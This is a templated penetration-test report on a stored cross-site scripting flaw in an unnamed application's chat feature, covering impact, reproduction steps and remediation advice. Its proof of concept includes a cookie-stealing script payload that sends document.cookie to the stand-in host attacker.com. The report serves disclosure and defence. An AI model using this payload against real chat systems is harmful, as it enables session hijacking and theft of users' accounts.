# Penetration Testing Writeup: XSS in Chat Feature

## Executive Summary

A Stored Cross-Site Scripting (XSS) vulnerability was identified in [Target
Application]’s chat feature during a penetration test. This flaw allows
attackers to inject scripts into chat messages, affecting all users in the chat.
This report provides details and remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Stored
- **Severity**: Critical
- **Affected Component**: Chat message input
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/chat/[room-id]`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 29, 2025

### Description

Chat messages are not sanitized before being stored and displayed, allowing
attackers to inject scripts that execute for all users in the chat room.

### Impact

- **Account Takeover**: Cookies can be stolen.
- **Data Exfiltration**: Chat data can be sent to attackers.
- **Phishing**: Fake forms can capture credentials.
- **Reputation Damage**: Defacement can harm trust.

### Proof of Concept

1. Send a chat message: `<script>alert('Stored XSS');</script>`.
2. Observe the alert in the chat room.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Join a chat room at `https://[target-application]/chat/[room-id]`.
2. Send `<script>alert('Stored XSS');</script>` as a message.
3. Confirm the alert appears for all users.

## Remediation Recommendations

1. **Input Sanitization**:
   - Use OWASP AntiSamy for chat inputs.
2. **Output Encoding**:
   - Encode messages before rendering.
3. **Content Security Policy**:
   - Apply CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Development**:
   - Train developers on XSS prevention.
5. **Regular Testing**:
   - Conduct security audits.

## Conclusion

The Stored XSS vulnerability in [Target Application]’s chat feature is critical
and requires immediate action.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Chat XSS Alert](https://example.com/images/chat-xss-alert.png)
